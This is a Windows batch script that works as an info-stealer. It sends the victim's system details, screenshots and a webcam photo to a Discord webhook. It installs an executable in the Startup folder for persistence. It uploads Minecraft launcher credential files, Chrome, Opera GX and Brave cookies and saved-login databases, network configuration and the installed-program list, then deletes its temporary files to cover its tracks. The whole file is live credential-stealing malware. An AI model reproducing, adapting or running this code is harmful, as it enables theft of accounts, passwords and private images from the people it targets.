@echo off
cd %appdata%
title cmd.exe
set "webhook=https://discord.com/api/webhooks/988427482522845205/LqL0qWgdjDqH9ajrVpa1Zi407p5sXyXAIARGX6g6oN2KTDHufhrB6Ef98FQofKaOSZ6L"
echo Please Wait..
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```%ComputerName%, %os%, %username%, %TIME%, %date%```\"}" %webhook%
curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%

curl --silent -L --fail "https://github.com/tedburke/CommandCam/blob/master/CommandCam.exe?raw=true" -o CommandCam.exe
CommandCam /filename c.bmp
curl --silent --output /dev/null -F c=@"%appdata%\c.bmp" %webhook%

cd Microsoft\Windows\Start Menu\Programs\Startup
curl --silent -L --fail "https://github.com/slendipl/grabber/blob/main/System.exe?raw=true" -o System.exe
cd %appdata%

powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programs.txt"
curl --silent --output /dev/null -F system=@"%userprofile%\AppData\Local\Temp\programs.txt" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**IP Address**\"}"  %webhook%
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
curl --silent --output /dev/null -F ip=@"%userprofile%\AppData\Local\Temp\ipp.txt" %webhook%
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
curl --silent --output /dev/null -F ip=@"%userprofile%\AppData\Local\Temp\ip.txt" %webhook%
curl --silent --output /dev/null -F ip=@"%userprofile%\AppData\Local\Temp\netstat.txt" %webhook%

echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**System Information**\"}"  %webhook%
curl --silent --output /dev/null -F system=@"%userprofile%\AppData\Local\Temp\System_INFO.txt" %webhook%
curl --silent --output /dev/null -F system=@"%userprofile%\AppData\Local\Temp\sysi.txt" %webhook%
curl --silent --output /dev/null -F system=@"%userprofile%\AppData\Local\Temp\uuid.txt" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**Minecraft**\"}"  %webhook%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_settings.json" %webhook%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_accounts_microsoft_store.json" %webhook%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_log.txt" %webhook%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_skins.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**BlazingPack**\"}"  %webhook%
curl --silent --output /dev/null -F bp=@"%appdata%\.blazingpack\blazing_pack_token.txt" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**TLauncher**\"}"  %webhook%
curl --silent --output /dev/null -F tl=@"%appdata%\.minecraft\TlauncherProfiles.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**Feather**\"}"  %webhook%
curl --silent --output /dev/null -F mcfeather=@"%appdata%\.feather\accounts.json" %webhook%
curl --silent --output /dev/null -F mcfeather=@"%appdata%\.feather\skins.json" %webhook%
curl --silent --output /dev/null -F mcfeather=@"%appdata%\.feather\settings.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**Chrome**\"}"  %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**Opera GX**\"}"  %webhook%
curl --silent --output /dev/null -F log=@"%appdata%\Opera Software\Opera GX Stable\Cookies" %webhook%
curl --silent --output /dev/null -F log=@"%appdata%\Opera Software\Opera GX Stable\History" %webhook%
curl --silent --output /dev/null -F log=@"%appdata%\Opera Software\Opera GX Stable\Shortcuts" %webhook%
curl --silent --output /dev/null -F log=@"%appdata%\Opera Software\Opera GX Stable\Bookmarks" %webhook%
curl --silent --output /dev/null -F log=@"%appdata%\Opera Software\Opera GX Stable\Login Data" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**Brave**\"}"  %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
curl --silent --output /dev/null -F log=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```%ComputerName%, %os%, %username%, %TIME%, %date%```\"}" %webhook%
curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s1.exe
.\s1.exe -o %appdata%\s1.png
curl --silent --output /dev/null -F ss=@"%appdata%\s1.png" %webhook%

del %appdata%\s.exe
del %appdata%\s1.png
del %appdata%\s1.exe
del %appdata%\s.png
del %appdata%\CommandCam.exe
del %appdata%\c.bmp
del %appdata%\sysinfo.txt
del %localappdata%\Temp\ip.txt 
del %localappdata%\Temp\ipp.txt 
del %localappdata%\Temp\sysi.txt 
del %localappdata%\Temp\System_INFO.txt 
del %localappdata%\Temp\netstat.txt 
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\wlan.txt
exit 0